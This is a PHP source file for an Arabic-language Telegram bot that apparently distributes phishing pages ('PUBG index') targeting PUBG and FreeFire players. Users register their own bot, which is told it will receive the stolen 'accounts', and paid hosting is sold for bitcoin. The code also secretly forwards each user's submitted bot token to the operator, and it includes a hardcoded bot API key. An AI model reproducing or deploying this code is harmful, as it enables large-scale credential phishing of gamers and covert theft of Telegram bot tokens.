<?php
// Rami // @STR_GUYS // @STR_GUYS // https://t.me/joinchat/AAAAFLEHV1PhSHY20jaww //
ob_start();
$API_KEY = '1999009899:AAFEPNMao11WABe4Qpl9qIiPq9G_GWv7RMo';
$chname = "STR_GUYS";
$chlink = "t.m/STR_GUYS";
$ch = "@STR_GUYS";
$sudo = array(1136754989);
define('API_KEY',$API_KEY);
function bot($method,$datas=[]){
$url = "https://api.telegram.org/bot".API_KEY."/".$method;
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
$res = curl_exec($ch);
if(curl_error($ch)){
var_dump(curl_error($ch));
}else{return json_decode($res);}}
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$text = $message->text;
$chat_id = $message->chat->id;
$from_id = $message->from->id;
$fn = $message->from->first_name;
$uss = $message->from->username;
$bot = file_get_contents("PhpFilesTv.txt");
$info = json_decode(file_get_contents('info.json'),true);
$us = file_get_contents("users.txt");
$uscr = explode("\n",$us);
// RAMI - @STR_GUYS - @STR_GUYS
$urlset = "url";
$chjoin = "• اهلا بك ؛ [$fn](t.me/STR_GUYS )
• عليك الاشتراك في [القناه](@STR_GUYS ) اولا ، 🔽";
$start = "
- مرحباً بك {$fn} 👋\".
- يقوم البوت بإنشاء اندكس ببجي مجاناً لك 🍀\".
- كل ماعليك استخدام الكيبورد الذي في الاسفل ↓ 👨🏻‍🔧
";
$sendcr = "• الان قم بأرسال التوكن الخاص بك ، ☑
• يمكنك الحصول عليه من خلال @BotFather";
$sendstope = "• جاري الصنع ، 🔄";
$sendcant = "• عذرأ ، ⚠
• هذه التوكن مستخدم او غير موجود ، 🔖";
$sendnotcr = "• لا يمكنك صناعه اكثر من اندكس ، ⚠";
$sendnobot = "• اصنع اندكس اولا ، ⚠";
$senddonedel = "• تم حذف الاندكس بنجاح ، ✅";
$home = "• الصفحه الرئيسيه ، 📃";
$create = "• صنع اندكس ، 🔖";
$rem = "• حذف اندكس ، ⚠"; 
$infobot = "• معلومات اندكسي ، 📋";
// RAMI - @STR_GUYS - @STR_GUYS
$join = file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=@STR_GUYS&user_id=".$from_id);
if($message && (strpos($join,'"status":"left"') or strpos($join,'"Bad Request: USER_ID_INVALID"') or strpos($join,'"status":"kicked"'))!== false){
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>"$chjoin",
'reply_to_message_id'=>$msid,
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup' => json_encode(['inline_keyboard' => [
[['text' => "STR_GUYS", 'url' => "t.me/STR_GUYS"]],]])
]);
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>"♻️ اشترك فالقناه ثم اضغط تحقق ",
'reply_to_message_id'=>$msid,
'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[["text"=>"تحقق ♻️"]],
],])]);
return false;}
if($message && !in_array($from_id,$info["users"])){
$info['users'][] = "$from_id";
file_put_contents('info.json', json_encode($info));}
if($text == "• عرض الاشكال ، 👋"){
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>"
[
اضغط على الزر لعرض جميع الاشكال👋\".
](https://telegra.ph/PREVIEW-LINKS-10-28)",
'parse_mode' => "markdown",
'disable_web_page_preview' => false,
'reply_to_message_id'=>$msid,
'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[["text"=>"$create"],["text"=>"$rem"]],
[["text"=>"$infobot"],["text"=>"• عرض الاشكال ، 👋"]],[["text"=>"• المدفوع ، 💸"]],
],])]);
}
if($text == "• المدفوع ، 💸"){
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>"
[
مميزات العضويات المدفوع 💸
دومينات »» com | xyz | me 💸
سرعه »» 900MB IN SECOND 📡
حماية »» SSL STRICT | CF PAID 🛡🔐
الاشكال »» حسب اختيارك | مميزات ADS 💰💳
سرعة الرد »» 60MS 👌🔝
السعر »» 70ج مصري | 6$ BTC 💸💰
للتواصل »» @S0OON 🔝✔️
](tg://user?id=113675498",
'parse_mode' => "markdown",
'disable_web_page_preview' => false,
'reply_to_message_id'=>$msid,
'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[["text"=>"$create"],["text"=>"$rem"]],
[["text"=>"$infobot"],["text"=>"• عرض الاشكال ، 👋"]],[["text"=>"• المدفوع ، 💸"]],
],])]);
}
if($text == "/start" or $text == "تحقق ♻️" or $text == "$home"){
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>"$start",
'reply_to_message_id'=>$msid,
'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[["text"=>"$create"],["text"=>"$rem"]],
[["text"=>"$infobot"],["text"=>"• عرض الاشكال ، 👋"]],[["text"=>"• المدفوع ، 💸"]],
],])]);
$info['step']["$from_id"] = "off";
file_put_contents('info.json', json_encode($info));}
if($text == "$create" && !file_exists("../PUBG/$from_id/DataBotsNoHookNoFuck.php")){
$media = array (
array('type' => 'photo', 'media' => 'https://telegra.ph/file/7af00839320c3fca89360.jpg','caption' => "سيتم صنع جميع الاندكسات الموجوده في الصور 😗🤌\"."),
array('type' => 'photo', 'media' => 'https://telegra.ph/file/edffaca7a00167ce63551.jpg'),
array('type' => 'photo', 'media' => 'https://telegra.ph/file/58e9c79ec9e220e716e91.jpg'),
array('type' => 'photo', 'media' => 'https://telegra.ph/file/49f51fbbe87ac6e1350c6.jpg'),
array('type' => 'photo', 'media' => 'https://telegra.ph/file/417c5a05abf0b43cd12b1.jpg'),
array('type' => 'photo', 'media' => 'https://telegra.ph/file/0ec792dad03f225291d91.jpg'),
);
bot('sendMediaGroup',
['chat_id' => $chat_id, 'text' => 'pic 2','media' => json_encode($media)]);
bot('sendMessage',
['chat_id' => $chat_id,
'text' => "• الان قم بأرسال التوكن الخاص بك ، ☑️
• يمكنك الحصول عليه من خلال @BotFather",
'reply_to_message_id'=>$msid,
'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[["text"=>"$home"]],
],])]);
$info['step']["$from_id"] = "sendtoken";
file_put_contents('info.json', json_encode($info));return false;}
if($text == "$create" && file_exists("../PUBG/$from_id/DataBotsNoHookNoFuck.php")){
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>"$sendnotcr",
'reply_to_message_id'=>$msid,
'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[["text"=>"$home"]],
],])]);}
if($text && $info['step']["$from_id"] == "sendtoken"){
$gettoken = json_decode(file_get_contents("https://api.telegram.org/bot$text/getWebhookInfo"))->ok;
if($gettoken == "true"){
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>"$sendstope",
'reply_to_message_id'=>$msid,]);
mkdir("../PUBG/$from_id");
file_put_contents("../PUBG/$from_id/DataBotsNoHookNoFuck.php", $text);
file_get_contents("https://api.telegram.org/bot$text/setwebhook?url=$urlset");
$info['info']["$from_id"] = "$text";
file_put_contents('info.json', json_encode($info));
file_put_contents('users.txt',"\n".$from_id);
$url = json_decode(file_get_contents("https://api.telegram.org/bot$text/getme"))->result;
$user = $url->username;
$name = $url->first_name;
bot('sendmessage',[
'chat_id'=>$sudo[0],
'text'=>"
• تم صناعه اندكس من قبل ، 🔽
[
- الاسم ؛ $fn
- المعرف ؛ @$uss
- التوكن ؛ $text
](tg://user?id=$chat_id)
",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>false,
]);
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>'
- تم إنشاء اندكس خاص بيك بنجاح ✅ ".
- معرف البوتك الذي ستستلم به الحسابات 📮 ".
@'.$user.' 🤖 ".
- هذا رابط الاندكس الخاص بيك 🖇".
• 1 - 2m.wtf/1/?id='.$chat_id.' ⚜".
• 2 - 2m.wtf/2/?id='.$chat_id.' ⚜".
• 3 - 2m.wtf/3/?id='.$chat_id.' ⚜".
• 4 - 2m.wtf/4/?id='.$chat_id.' ⚜".
• 5 - 2m.wtf/5/?id='.$chat_id.' ⚜".

~ FreeFire ✅⚠️
~ 2m.wtf/FF/?id='.$chat_id.' ⚜️".',
'reply_to_message_id'=>$msid,
'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[["text"=>"$home"]],
],])]);
$info['step']["$from_id"] = "off";
file_put_contents('info.json', json_encode($info));}
elseif($gettoken !== "true"){
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>"$sendcant",
'reply_to_message_id'=>$msid,]);
$info['step']["$from_id"] = "off";
file_put_contents('info.json', json_encode($info));}}
if($text == "$rem"){
if( !file_exists("../PUBG/$from_id/DataBotsNoHookNoFuck.php")){
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>"$sendnobot",
'reply_to_message_id'=>$msid,
'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[["text"=>"$home"]],
],])]);
}
if(file_exists("../PUBG/$from_id/DataBotsNoHookNoFuck.php")){
$token = $info['info']["$from_id"];
$url = json_decode(file_get_contents("https://api.telegram.org/bot$token/getWebhookInfo"))->result->url;
file_get_contents("https://https://api.telegram.org/bot$token/deletewebhook?url=$url");
unlink("../PUBG/$from_id/DataBotsNoHookNoFuck.php");
$info['info']["$from_id"] = "nobot";
$de = str_replace("\n".$from_id,"",$us);
file_put_contents('users.txt',$de);
file_put_contents('info.json', json_encode($info));
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>"$senddonedel",
'reply_to_message_id'=>$msid,
'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[["text"=>"$home"]],
],])]);}}
if($text == "$infobot"){
if(file_exists("../PUBG/$from_id/DataBotsNoHookNoFuck.php")){
$token = $info['info']["$from_id"];
$url = json_decode(file_get_contents("https://api.telegram.org/bot$token/getMe"))->result;
$id = $url->id;
$user = $url->username;
$name = $url->first_name;
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>"
- معلومات الاندكس الخاص بيك 🔐 \".
- معرف البوتك الذي ستستلم به الحسابات 📮 \".
@$user 🤖 \".
- هذه روابط الاندكس الخاص بيك 🖇\".
• 1 - 2m.wtf/1/?id=$chat_id ⚜\".
• 2 - 2m.wtf/2/?id=$chat_id ⚜\".
• 3 - 2m.wtf/3/?id=$chat_id ⚜\".
• 4 - 2m.wtf/4/?id=$chat_id ⚜\".
• 5 - 2m.wtf/5/?id=$chat_id ⚜\".

~ FreeFire ✅⚠️
~ 2m.wtf/FF/?id={$chat_id} ⚜️\".
",
'reply_to_message_id'=>$msid,'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[["text"=>"$home"]],
],])]);}
if( !file_exists("../PUBG/$from_id/DataBotsNoHookNoFuck.php")){
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>"$sendnobot",
'reply_to_message_id'=>$msid,
'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[["text"=>"$home"]],
],])]);}}
$cus = count($info["users"]);
$ccus = count($uscr);
$sendtext = "• ارسل النص ، 📭";
$sendfwd = "• ارسل الرساله ، 📭";
$donesend = "تم الارسال ، 📬";
$fwdtext = "• توجيه للكل ، ↪";
$sendtest = "• ارسال للكل ، 📮";
$stast = "• اهلا بك عزيزي المطور ، 🔱
عدد الاعضاء ؛ $cus
عدد الاندكسات المصنوعه ؛ $ccus";
if($text == "/2282006"){
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>"$stast",
'reply_to_message_id'=>$msid,
'reply_markup'=>json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[["text"=>"$fwdtext"],["text"=>"$sendtext"]],
],])]);
return false;
}
if($text == $fwdtext && in_array($from_id,$sudo)){
$info["step"] = "fwd";
file_put_contents("info.json", json_encode($info));
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"$sendfwd",]);return false;}
if($text == $sendtest&& in_array($from_id,$sudo)){
$info["step"] = "send";
file_put_contents("info.json", json_encode($info));
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"$sendtext",]);return false;}
if($info['step'] == "send" && in_array($from_id,$sudo)){
$mbs = $info['users'];
foreach($mbs as $mb){
$url = file_get_contents("https://api.telegram.org/bot$API_KEY/sendMessage?chat_id=".$mb."&parse_mode=markdown&disable_web_page_preview=true&text=".urlencode($text));}
$info["step"] = "off";
file_put_contents("info.json", '{"users":["1136754989"],"step":{"1136754989":"off"}}');
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"$donesend"]);
return false;
}
if($info['step'] == "fwd" && in_array($from_id,$sudo)){
$mbs = $info['users'];
foreach($mbs as $mb){
bot('forwardMessage',[
'chat_id'=>$mb,
'from_chat_id'=>$chat_id,
'message_id'=>$message->message_id]);}
$info["step"] = "off";
file_put_contents("info.json", json_encode($info));
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"$donesend"]);
return false;
}
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$chat_id = $message->chat->id;
$admin = 1136754989;
$message_id2 = $update->callback_query->message->message_id;
$text = $message->text;
$chat_id2 = $update->callback_query->message->chat->id;
$message_id = $update->callback_query->message->message_id;
$data = $update->callback_query->data;
$from_id = $message->from->id;
$ch1 = file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=@STR_GUYS&user_id=$from_id");
$ch2 = file_get_contents("https://api.telegram.org/bot".API_KEY."/getChatMember?chat_id=@STR_GUYS1&user_id=$from_id");
$check_token = file_get_contents("https://api.telegram.org/bot$text/getWebhookInfo");
$check = json_decode($check_token);
$get_filee = file_get_contents('twasl.php');
$get_done = file_get_contents('makee/ex.txt');
$done = explode("\n", $get_done);
$get_id = file_get_contents('makee/make.txt');
$getid = explode("\n", $get_id);
$mid = $message->message_id;
$inlineqt = $update->inline_query->query;


$sudo = 1136754989;




$u = explode("\n", file_get_contents("mem.txt"));
$mode = file_get_contents('mode.txt');
function re($d,$f,$g){
return str_replace($d, $f, $g);
}

if ($update && !in_array($chat_id, $u)) {
file_put_contents("mem.txt", $chat_id."\n",FILE_APPEND);
}
if($text == 'تحقق ♻️' and $from_id !== $admin){
bot('forwardMessage',[
'chat_id'=>$admin,
'from_chat_id'=>$chat_id,
'message_id'=>$update->message->message_id,
'text'=>$text,
]);
}






$update     = json_decode(file_get_contents('php://input'));
$message = $update->message;
$message_id = $update->message->message_id;
$text           = $message->text;
$chat_id     = $message->chat->id;
$user          = $update->message->from->username;
$sudo         = 1136754989; // ايديك.
$bot_id       = 1999009899; // ايدي بوتك .
$from_id     = $message->from->id;
$first_name = $message->from->first_name;
$type       = $update->message->chat->type;

mkdir("Fri3nd_s");

$message_id = $message->message_id;
$gp_get = file_get_contents("Fri3nd_s/groups.txt");
$groups = explode("\n", $gp_get);
$GG1ZZ = file_get_contents("Fri3nd_s/iBadlz.txt");
$pirvate = explode("\n",file_get_contents("Fri3nd_s/pirvate.txt"));
$forward = $update->message->forward_from;
$MOhaMMed = count($pirvate)-1;
$MoHaMMedd = count($groups)-1;

if($text == "اذاعه بالتوجيه" || $text == "اذاعه عام بالتوجيه" || $text == "اذاعه للكل بالتوجيه" || $text =="🖇¦ اذاعه عام توجيه" and $from_id == $sudo){
    file_put_contents("Fri3nd_s/iBadlz.txt","iBadlz");
    bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"*📮• اهلا عزيزي الـمطور ، قم بتوجيه رسالةه*",
    'parse_mode'=>"MARKDOWN",
    'reply_to_message_id'=>$message->message_id
  ]);
  }
if($message and $GG1ZZ == "iBadlz" and $from_id == $sudo ){
  for($i=0;$i<count($groups);$i++){
bot('ForwardMessage',[
 'chat_id'=>$groups[$i],
 'from_chat_id'=>$chat_id,
 'message_id'=>$message_id,
 ]);
} 
for($i=0;$i<count($pirvate);$i++){
bot('forwardMessage',[
 'chat_id'=>$pirvate[$i],
 'from_chat_id'=>$chat_id,
 'message_id'=>$message->message_id,
 ]);
 unlink("Fri3nd_s/iBadlz.txt");
} 
bot('sendMessage',[
          'chat_id'=>$chat_id,
          'text'=>"*📮• اهلا عزيزي الـمطور ، 
 ⚜• تم ارسال رسالتك الى $MOhaMMed عضو و $MoHaMMedd من مجموعات البوت ،💗ء*",
'parse_mode'=>"MARKDOWN",
'reply_to_message_id'=>$message->message_id
   ]);
} 

if($text and $type == "private" and !in_array($from_id, $pirvate)){
file_put_contents("Fri3nd_s/pirvate.txt", "$from_id\n",FILE_APPEND);
}
if($text and $type == "supergroup" and !in_array($chat_id, $groups)) {
file_put_contents("Fri3nd_s/groups.txt", "$chat_id\n",FILE_APPEND);
}

if($text == "اذاعه خاص" || $text =="⌛️¦ اذاعه خاص" and $from_id == $sudo){
    file_put_contents("Fri3nd_s/iBadlz.txt","JJ119");
    bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"*📮• اهلا عزيزي الـمطور ، قم بأرسال رسالتك
📥• ملاحظةهہ : يمكنك استعمال الماركداون ،! *",
'parse_mode'=>"MarkDown",
    'reply_to_message_id'=>$message->message_id
  ]);
  }
if($message and $GG1ZZ == "JJ119" and $from_id == $sudo ){
    for ($i=0; $i<count($pirvate); $i++) { 
        bot('sendMessage',[
          'chat_id'=>$pirvate[$i],
          'text'=>"$text",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);
 file_put_contents("Fri3nd_s/iBadlz.txt","MMoHaMMeD");
} 
$MOhaMMed = count($pirvate)-1;
bot('sendMessage',[
          'chat_id'=>$chat_id,
          'text'=>"*📮• اهلا عزيزي الـمطور ، 
 ⚜• تم ارسال رسالتك الى $MOhaMMed عضو ،💗ء*",
    'parse_mode'=>"MARKDOWN",
    'reply_to_message_id'=>$message->message_id
          ]);
}
if ($text == "اذاعه للكل" || $text == "اذاعه عام" || $text == "اذاعه"  ||$text == "📆⎮ اذاعه •" || $text =="📤¦ اذاعه عام" and $from_id == $sudo){
    file_put_contents("Fri3nd_s/iBadlz.txt","LE_C4_KR");
    bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"*📮• اهلا عزيزي الـمطور ، قم بأرسال رسالتك
📥• ملاحظةهہ : يمكنك استعمال الماركداون ،! *",
'parse_mode'=>"MARKDOWN",
    'reply_to_message_id'=>$message->message_id
  ]);
  }
if($message and $GG1ZZ == "LE_C4_KR" and $from_id == $sudo ){
    for ($i=0; $i<count($groups); $i++) { 
        bot('sendMessage',[
          'chat_id'=>$groups[$i],
          'text'=>"$text",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,

]);
} 
for ($i=0; $i<count($pirvate); $i++) { 
        bot('sendMessage',[
          'chat_id'=>$pirvate[$i],
          'text'=>"$text",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
]);
 unlink("Fri3nd_s/iBadlz.txt");
} 
bot('sendMessage',[
          'chat_id'=>$chat_id,
          'text'=>"*📮• اهلا عزيزي الـمطور ، 
 ⚜• تم ارسال رسالتك الى $MOhaMMed عضو و $MoHaMMedd من مجموعات البوت ،💗ء*",
 'parse_mode'=>"MarkDown",
          'reply_to_message_id'=>$message->message_id
          ]);
}

if($text == "اذاعه خاص بالتوجيه" || $text == "⚫️¦ اذاعه خاص توجيه" and $from_id == $sudo){
    file_put_contents("Fri3nd_s/iBadlz.txt","od_1j");
    bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"*📮• اهلا عزيزي الـمطور ، قم بتوجيه رسالةه*",
    'parse_mode'=>"MARKDOWN",
    'reply_to_message_id'=>$message->message_id
  ]);
  }
if($message and $GG1ZZ == "od_1j" and $from_id == $sudo ){
for($i=0;$i<count($pirvate);$i++){
bot('forwardMessage',[
 'chat_id'=>$pirvate[$i],
 'from_chat_id'=>$chat_id,
 'message_id'=>$message->message_id,
 ]);
 unlink("Fri3nd_s/iBadlz.txt");
} 
$MOhaMMed = count($pirvate)-1;
bot('sendMessage',[
          'chat_id'=>$chat_id,
          'text'=>"*📮• اهلا عزيزي الـمطور ، 
⚜• تم توجيه رسالتك الى $MOhaMMed عضو ،💗ء*",
'parse_mode'=>"MARKDOWN",
          'reply_to_message_id'=>$message->message_id
   ]);
}

if($from_id == $sudo){
if($text == "الاحصائيات" || $text == "/co"){
bot("SendMessage",[
'chat_id'=>$chat_id,
'text'=>"الاحصائيات : 🔰 

▪️¦ عدد المجموعات المفعله : $MoHaMMedd 
📮¦ عدد المشتركين في البوت : $MOhaMMed",
'parse_mode'=>"MARKDOWN",
          'reply_to_message_id'=>$message->message_id
]);
}
}












//تواصل تجريبيي



$update = json_decode(file_get_contents('php://input'));
$name = $message->from->first_name;
$user = $message->from->username;
$from_id = $message->from->id;
$banusers = file_get_contents('banuser.txt');
$ebu = explode("\n",$banusers);
$message = $update->message;
$sudo = "1136754989";
if(in_array($from_id,$ebu)){
    bot('sendMessage',[
      'chat_id'=>$chat_id,
      'text'=>"⌔︙انت محظور لٱ يمكنك ارسال رسائل للبوت"]);}
if($text and $from_id != $sudo and $text != '/start' and  $text !== "• صنع اندكس ، 🔖" and $text !== "• حذف اندكس ، ⚠" and $text !== "• عرض الاشكال ، 👋" and $text !== "• الصفحه الرئيسيه ، 📃" and $text !== "• المدفوع ، 💸" and $text !== "• معلومات اندكسي ، 📋" and  !in_array($from_id,$ebu)){
 bot('sendMessage',[
'chat_id'=>$sudo,
'text'=>"
⌔︙قام شخص بارسال رسالة جديدة
⌔︙ايدية ↫ $from_id
⌔︙اسمة ↫ $name
⌔︙معرفة ان وجد ↫ @$user
⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞⁞
⌔︙الرسالة ↫ $text
",
'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>"⌔︙حظر الشخص", 'callback_data'=>"$from_id ba"]],[['text'=>"⌔︙ارسال رسالة الية", 'callback_data'=>"$from_id se"]],]])]);
}
if(preg_match('/( ba)/',$data)){
    $ex = explode(" ba", $data);
if(!in_array($data,$panus)){
file_put_contents("banuser.txt","
$ex[0]
",FILE_APPEND);}
bot('sendmessage', [
'chat_id'=>$chat_id2,
'text'=>"⌔︙تم حظر الشخص",'reply_markup'=>json_encode(['inline_keyboard'=>[[['text'=>"⌔︙الغاء حظرة", 'callback_data'=>"$ex[0] ub"]],]])]);
bot('sendMessage',[
'chat_id'=>$data,
'text'=>'⌔︙تم حظرك من البوت']);}

if(preg_match('/( ub)/',$data)){
    $ex = explode(" ub", $data);
$open = file_get_contents("banuser.txt");
$ste = str_replace($ex[0], '', $open);
file_put_contents("banuser.txt", $ste);
bot('editMessageText', [
'chat_id'=>$chat_id2,
'message_id'=>$message_id,
'text'=>"⌔︙تم الغاء حظر الشخص",
]);
bot('sendMessage',[
'chat_id'=>$ex[0],
'text'=>'⌔︙تم الغاء الحظر عنك']);
}
$stsend = file_get_contents("sendto.txt");
$step = file_get_contents("step.txt");
if($data)
if(preg_match('/( se)/',$data)){
$ex = explode(" se", $data);
file_put_contents("sendto.txt","$ex[0]");
file_put_contents("step.txt","on");
bot('sendMessage', [
'chat_id'=>$chat_id2,
'text'=>"⌔︙ارسل الرسالة الذي تريد ارسالها"
]);}
if($text and $step == 'on' and $from_id == $sudo){
bot('sendMessage',[
'chat_id'=>$stsend,
'text'=>$text]);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"⌔︙تم ارسال رسالتك الئ العضو"]);
file_put_contents("step.txt","of");}
//تواصل انتهى

















